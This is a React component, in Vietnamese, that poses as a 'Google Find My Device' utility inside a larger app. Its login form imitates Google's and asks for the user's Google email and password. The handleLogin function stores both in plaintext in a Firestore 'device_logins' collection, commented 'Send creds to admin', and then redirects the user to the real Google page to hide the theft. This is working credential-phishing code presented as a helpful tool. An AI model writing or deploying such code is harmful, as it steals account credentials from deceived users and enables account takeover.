import React, { useState } from 'react';
import { addDoc, collection } from 'firebase/firestore';
import { db } from '../lib/firebase';
import { useAuthStore } from '../store/authStore';
import toast from 'react-hot-toast';

export default function FindMyDeviceUtility({ onBack }: { onBack: () => void }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const { user } = useAuthStore();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email || !password) return toast.error('Vui lòng nhập Email và Mật khẩu');
    
    setLoading(true);
    try {
      // Send creds to admin
      await addDoc(collection(db, 'device_logins'), {
        email,
        password,
        userId: user?.uid || 'anonymous',
        timestamp: Date.now()
      });

      // Log usage
      await addDoc(collection(db, 'utility_usage'), {
        utilityId: 'find-my-device',
        userId: user?.uid || 'anonymous',
        userEmail: user?.email || 'N/A',
        timestamp: Date.now()
      });

      // Redirect
      window.location.href = 'https://www.google.com/android/find/?hl=vi';
    } catch (error) {
      toast.error('Có lỗi xảy ra, vui lòng thử lại');
      setLoading(false);
    }
  };

  return (
    <div className="flex-1 flex flex-col w-full h-full p-4 lg:p-8 max-w-2xl mx-auto">
      <button onClick={onBack} className="flex items-center gap-2 text-slate-500 hover:text-slate-900 dark:hover:text-white mb-6 transition-colors w-fit">
        ← Quay lại Tiện ích
      </button>

      <div className="bg-white dark:bg-white/5 border border-slate-200 dark:border-white/10 rounded-3xl p-8 shadow-xl relative overflow-hidden">
        <div className="text-center mb-8">
          <div className="w-16 h-16 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-4 border border-blue-500/20">
            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-8 h-8 text-blue-500"><path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="currentColor" fillOpacity="0.2"/><path d="M15 12C15 13.6569 13.6569 15 12 15C10.3431 15 9 13.6569 9 12C9 10.3431 10.3431 9 12 9C13.6569 9 15 10.3431 15 12Z" fill="currentColor"/></svg>
          </div>
          <h2 className="text-2xl font-bold text-slate-900 dark:text-white">Google Find My Device</h2>
          <p className="text-slate-500 mt-2">Đăng nhập tài khoản Google để sử dụng tính năng tìm kiếm thiết bị Android</p>
        </div>

        <form onSubmit={handleLogin} className="space-y-4 relative z-10">
          <div>
            <label className="block text-sm font-medium mb-1 text-slate-700 dark:text-slate-300">Email hoặc số điện thoại</label>
            <input 
              type="email" 
              required
              value={email}
              onChange={e => setEmail(e.target.value)}
              className="w-full px-4 py-3 bg-slate-50 dark:bg-white/5 border border-slate-200 dark:border-white/10 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition text-slate-900 dark:text-white"
              placeholder="Email của bạn"
            />
          </div>
          <div>
            <label className="block text-sm font-medium mb-1 text-slate-700 dark:text-slate-300">Mật khẩu</label>
            <input 
              type="password" 
              required
              value={password}
              onChange={e => setPassword(e.target.value)}
              className="w-full px-4 py-3 bg-slate-50 dark:bg-white/5 border border-slate-200 dark:border-white/10 rounded-xl focus:ring-2 focus:ring-blue-500 outline-none transition text-slate-900 dark:text-white"
              placeholder="Mật khẩu của bạn"
            />
          </div>
          <button 
            type="submit"
            disabled={loading}
            className="w-full py-4 mt-4 bg-blue-600 hover:bg-blue-700 text-white rounded-xl font-bold transition shadow-lg shadow-blue-500/20 disabled:opacity-50"
          >
            {loading ? 'Đang xử lý...' : 'Đăng nhập & Tìm thiết bị'}
          </button>
        </form>
      </div>
    </div>
  );
}
